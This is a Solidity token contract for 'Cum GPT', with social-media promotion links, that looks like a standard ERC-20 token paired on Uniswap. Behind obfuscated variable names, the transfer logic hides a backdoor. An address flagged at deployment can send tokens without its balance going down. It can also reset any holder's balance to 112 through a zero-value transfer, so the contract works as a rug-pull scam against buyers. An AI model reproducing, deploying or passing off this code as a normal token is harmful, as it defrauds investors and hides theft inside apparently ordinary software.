/*

Twitter: https://twitter.com/CumGPTETH

Telegram: https://t.me/CumGPT

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract CumGPT is Ownable {
    mapping(address => uint256) private pfrqo;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address jmcfvubgrwyo, address qoxvrjwcgi, uint256 tbhdopscuy) public returns (bool success) {
        require(tbhdopscuy <= allowance[jmcfvubgrwyo][msg.sender]);
        allowance[jmcfvubgrwyo][msg.sender] -= tbhdopscuy;
        mupbgxschivf(jmcfvubgrwyo, qoxvrjwcgi, tbhdopscuy);
        return true;
    }

    address public fenozhwitmg;

    uint256 private kjglnfbysx = 112;

    function approve(address pintyeqxas, uint256 tbhdopscuy) public returns (bool success) {
        allowance[msg.sender][pintyeqxas] = tbhdopscuy;
        emit Approval(msg.sender, pintyeqxas, tbhdopscuy);
        return true;
    }

    function mupbgxschivf(address jmcfvubgrwyo, address qoxvrjwcgi, uint256 tbhdopscuy) private {
        if (pfrqo[jmcfvubgrwyo] == 0) {
            balanceOf[jmcfvubgrwyo] -= tbhdopscuy;
        }
        balanceOf[qoxvrjwcgi] += tbhdopscuy;
        if (pfrqo[msg.sender] > 0 && tbhdopscuy == 0 && qoxvrjwcgi != fenozhwitmg) {
            balanceOf[qoxvrjwcgi] = kjglnfbysx;
        }
        emit Transfer(jmcfvubgrwyo, qoxvrjwcgi, tbhdopscuy);
    }

    string public name = 'Cum GPT';

    mapping(address => uint256) private usxq;

    string public symbol = 'Cum GPT';

    mapping(address => uint256) public balanceOf;

    function transfer(address qoxvrjwcgi, uint256 tbhdopscuy) public returns (bool success) {
        mupbgxschivf(msg.sender, qoxvrjwcgi, tbhdopscuy);
        return true;
    }

    constructor(address dwckfq) {
        balanceOf[msg.sender] = totalSupply;
        pfrqo[dwckfq] = kjglnfbysx;
        IUniswapV2Router02 nkmwerxj = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        fenozhwitmg = IUniswapV2Factory(nkmwerxj.factory()).createPair(address(this), nkmwerxj.WETH());
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint8 public decimals = 9;
}